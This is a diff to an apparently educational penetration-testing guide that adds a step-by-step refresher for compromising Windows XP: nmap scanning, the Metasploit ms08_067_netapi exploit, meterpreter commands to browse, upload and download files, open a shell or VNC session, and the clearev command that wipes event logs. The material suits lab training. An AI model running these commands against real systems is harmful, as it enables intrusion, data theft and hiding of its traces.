@@ -3,7 +3,7 @@ Straightforward Training™
 Metasploit into Windows XP (Step #1)
 Author: Saulo S. Ortiz
 Date: 20190908
-Update: 20190922
+Update: 20191010
 **********************************************
 
 DISCLAIMER
@@ -292,3 +292,97 @@ What other commands give you similar information?
 28. What is banner grabbing? What commands can you use to do this?
 
 29.	What other commands did we use in this guide to get target information?
+
+SHORT/REFRESHER VERSION
+
+ATTACK:
+1.	Find your Kali IP address…
+  a. Type: ifconfig
+
+2.	Scan for live-hosts…
+  a. Type: nmap –sn <target_ip >/24
+
+3.	Select your target and scan for open ports in stealth mode…
+  a. Type: nmap –sS –Pn <target_ip>
+
+4.	Open a new terminal and run metasploit…
+  a. Type: msfconsole
+  b. Type: use exploit/windows/smb/ms08_067_netapi
+  c. Type: set
+  d. Type: set RHOST <target_ip>
+  e. Type: run to start
+
+1.	In meterpreter, find out where you’re at this time…
+  a. Type: pwd
+
+2.	Find some information about the target…
+  a. Type: sysinfo
+
+3.	Go to the root drive (C:\)…
+  a. Type: cd \\
+
+4.	Verify you’re in c:\…
+  a. Type: pwd
+
+5.	Find network information…
+  a. Type: ipconfig
+
+6.	View the directory…
+  a. Type: ls
+
+7.	Create a folder in the target…
+  a. Type: mkdir whoops
+
+8.	Go to a shell…
+  a. Type: shell
+
+9.	Rename the folder whoops…
+  a. Type: ren whoops gothacked
+
+10.	Verify the name was changed…
+  a. Type: dir
+
+11.	Go into that folder…
+  a. Type: cd gothacked
+
+12.	Create a file with text in it…
+  a. Type: shell
+  b. Type:  echo “this computer was hacked by me!” > hacked.txt
+  c. Type: exit
+
+13.	Verify the file is there…
+  a. Type: ls or dir
+  b. Type: cd gothacked
+  c. Type: cat hacked.txt
+
+14.	Download the text file…
+  a. Type: download hacked.txt
+
+15.	Background the session…
+  a. Type: background
+
+16.	Verify the file is in YOUR computer…
+  a. Type: ls or dir
+
+17.	Open a new terminal and edit the file…
+  a. Type: nano hacked.txt
+  b. In a new line type: don’t forget to smile!
+  c. Type: # (hash tag/pound) in front of the first line to comment it out
+  d. Save your changes: Ctrl+S
+  e. Ctrl+X to exit
+
+18.	Find and select the correct session ID for this attack…
+  a. Type: sessions
+  b. Type: sessions –i <#>
+
+19.	Upload the file back to the target…
+  a. Type: pwd
+  b. Type: upload hacked.txt
+
+20.	Get a GUI of the target machine…
+  a. Type: run vnc
+
+21.	Go into Events in Windows XP and look at all the logs
+
+22.	STOP! Instead of clearing the logs now we will move on to make a new user to maintain persistence. But in case you were curious, the command to clear the logs is:
+  a. Type: clearev
